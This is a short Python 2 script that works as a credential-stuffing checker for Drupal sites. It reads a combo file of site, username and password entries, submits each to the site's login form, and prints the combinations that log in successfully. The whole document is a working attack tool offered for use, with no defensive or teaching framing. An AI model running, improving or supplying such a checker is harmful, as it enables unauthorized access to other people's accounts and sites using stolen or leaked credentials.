import requests # We will be using requests it's cool
import re
from sys import argv

class Drupal(object) :
  
  def __init__(self, website, user, password) :
    self.website  = website
    self.user     = user
    self.password = password
    self.req = requests.Session()

  def makeReq(self) :
    postdata = {
      'name' : self.user,
      'pass' : self.password,
      'form_build_id' : 'form-pl5wVd5PUbwtt9aazUjzRLvugRfXYvT211SdYbTWdOc',
      'form_id'       : 'user_login',
      'op' : 'Log+in' 
    }
    self.req.post(self.website+'?q=user', data=postdata)

  def checkLogedin(self) :
    html = self.req.get(self.website+'?q=user').text
    a = True
    #print html
    if re.findall('Username *', html) : 
      a = False
    return a

try :
  with open(argv[1], 'r') as myfile : 
    combo = myfile.read().split()
  # This will be closed automatically
  #print combo
  for comb in combo :
    a, site, user, passwd = comb.split(':')
    site = a+':'+site
    dru = Drupal(site, user, passwd)
    dru.makeReq()
    if dru.checkLogedin() :
      print "\033[01;32m" + site+':'+user+':'+passwd + "\033[00m"
except IndexError:
  print "[!] Usage python "+ argv[0] + " textfile.txt"